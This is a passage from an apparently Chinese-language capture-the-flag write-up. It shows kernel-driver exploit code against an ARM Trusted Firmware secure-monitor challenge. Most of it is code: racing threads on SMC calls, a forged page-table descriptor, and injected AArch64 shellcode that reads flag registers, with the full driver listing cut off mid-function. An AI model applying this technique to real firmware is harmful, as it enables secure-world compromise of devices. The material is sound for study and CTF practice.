</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">STORAGE_SVC_WR</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span> <span class="c1">// 将memcpy和shellcode地址分别写入LOG_SVC的两个handler，调用号任意
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">//arm_smccc_smc(STORAGE_SVC_RD, 0xf, SC_RW_ADDR, 0x60, 0, 0, 0, 0, &amp;res); // 动态调试找页表项位置
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">FAKE_DESC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_ABWR</span><span class="p">,</span> <span class="n">FAKE_DESC_ADDR</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span> <span class="c1">// 写入伪造的页表项
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 单独写一个c文件，用内联汇编生成二进制文件后用IDA提取出来
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0xD6</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MOVK X0, #0x423d, LSL #16\n&#34; // 把flag存到0x423dc000+0x100
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MOVK X0, #0xc100\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_1\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#4]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_2\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#8]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_3\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0xC]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_4\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x10]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_5\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x14]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_6\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x18]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;MRS X1, S3_3_C15_C12_7\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;STR W1, [X0,#0x1C]\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">        &#34;ret\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ns_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_ABWR</span><span class="p">,</span> <span class="n">SC_RW_ADDR</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span> <span class="c1">// 写入shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_SC</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span> <span class="c1">// 跳转到shellcode执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ns_mem</span><span class="p">)</span><span class="o">+</span><span class="mh">0x100</span><span class="p">);</span> <span class="c1">// 从0x423dc000+0x100读flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h1 id="完整exp">完整Exp<a hidden class="anchor" aria-hidden="true" href="#完整exp">#</a></h1>
<h2 id="driver">Driver<a hidden class="anchor" aria-hidden="true" href="#driver">#</a></h2>
<p>smc_driver.c</p>
<blockquote>
<p>注：引用下载的内核源码路径的头文件</p></blockquote>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/kernel.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/module.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/init.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/device.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/arm-smccc.h&#34; //arm_smccc_smc</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/kthread.h&#34; // kthread</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;linux-6.6/include/linux/string.h&#34; // memset</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_NAME1 &#34;step1_driver&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_NAME2 &#34;step2_driver&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">step1_major_number</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">step2_major_number</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">class</span><span class="o">*</span> <span class="n">step1_class</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">class</span><span class="o">*</span> <span class="n">step2_class</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">device</span><span class="o">*</span> <span class="n">step1_device</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">device</span><span class="o">*</span> <span class="n">step2_device</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// call type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define SMC_TYPE_FAST    1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SMC_TYPE_YIELD   0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// calling convention
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define SMC_64   1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SMC_32   0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">// oen
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define OEN_LOG_SVC       7
</span></span></span><span class="line"><span class="cl"><span class="cp">#define OEN_STORAGE_SVC   9
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// shift and mask
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define FUNCID_TYPE_SHIFT   31
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_CC_SHIFT     30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_OEN_SHIFT    24
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FUNCID_NUM_SHIFT    0
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* SMC FID */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define SMC_FID(type, cc, oen, num) ((type&lt;&lt;FUNCID_TYPE_SHIFT) | (cc&lt;&lt;FUNCID_CC_SHIFT) | \
</span></span></span><span class="line"><span class="cl"><span class="cp">                                     (oen&lt;&lt;FUNCID_OEN_SHIFT) | (num&lt;&lt;FUNCID_NUM_SHIFT))
</span></span></span><span class="line"><span class="cl"><span class="cp">#define STORAGE_SVC_WR   0xC9000031
</span></span></span><span class="line"><span class="cl"><span class="cp">#define STORAGE_SVC_RD   0xC9000032
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SMC_FID(num)   SMC_FID(SMC_TYPE_YIELD, SMC_64, OEN_LOG_SVC, num)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_PLOG_SET   LOG_SMC_FID(2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_PLOG_RD    LOG_SMC_FID(3)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_ABWR       LOG_SMC_FID(2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_SC         LOG_SMC_FID(3)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BL31_NS_MEM       0x423dc000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BL31_NS_MEM_SIZE  0x1000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define MAX_SIZE_ADDR     0xE0D70B0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MEMCPY_ADDR       0xE0A3160
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define FAKE_DESC_ADDR    0xe0d96f0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FAKE_DESC         0xe0db7c3
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SC_RW_ADDR        0xe0db000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SC_EXEC_ADDR      0xe0de000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ns_mem</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">func1_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task2</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;func1 is running on CPU %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">smp_processor_id</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">kthread_should_stop</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">STORAGE_SVC_WR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="o">+</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">a0</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Condition successed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">kthread_stop</span><span class="p">(</span><span class="n">task2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">func2_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;func2 is running on CPU %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">smp_processor_id</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nf">kthread_should_stop</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ns_mem</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">MAX_SIZE_ADDR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step1_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step1: Device opened</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task1</span><span class="p">,</span> <span class="o">*</span><span class="n">task2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span> <span class="o">=</span> <span class="nf">phys_to_virt</span><span class="p">(</span><span class="n">BL31_NS_MEM</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arm_smccc_smc</span><span class="p">(</span><span class="n">LOG_SVC_PLOG_SET</span><span class="p">,</span> <span class="n">BL31_NS_MEM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;SMC Driver: LOG_SVC_PLOG_SET, res.0 = 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">res</span><span class="p">.</span><span class="n">a0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
